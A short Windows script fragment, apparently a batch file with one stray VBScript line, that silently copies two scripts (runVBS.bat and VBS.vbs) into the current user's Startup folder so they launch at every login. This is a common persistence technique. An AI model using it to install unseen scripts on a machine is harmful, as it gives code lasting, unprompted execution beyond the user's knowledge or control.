Set Shell = CreateObject("Shell.Application")

Rem The /y supresses the prompt that would happen if there were duplicate files there
xcopy /y "runVBS.bat" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /y "VBS.vbs" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
